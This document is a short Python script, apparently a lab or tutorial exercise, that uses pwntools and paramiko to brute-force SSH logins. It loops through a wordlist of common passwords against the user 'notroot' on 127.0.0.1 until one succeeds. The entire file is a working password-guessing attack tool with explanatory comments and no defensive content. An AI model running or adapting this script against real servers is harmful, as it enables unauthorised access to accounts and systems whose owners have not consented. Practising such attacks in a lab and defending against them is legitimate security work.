# Import the necessary libraries
from pwn import *  # pwn is a library used for crafting exploits
import paramiko  # paramiko is used for SSH connections

# SSH server details
host = "127.0.0.1"  # IP address of the target SSH server
username = "notroot"  # Username for which we are trying to guess the password
attempts = 0  

# Open the file containing a list of common passwords
with open("ssh-common-passwords.txt", "r") as password_list:
    # Iterate over each password in the file
    for password in password_list:
        password = password.strip("\n")  # Remove newline characters from the password
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            # Attempt to create an SSH connection using the current password
            response = ssh(host=host, user=username, password=password, timeout=1)
            # Check if the connection was successful
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close() 
                break 
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1 
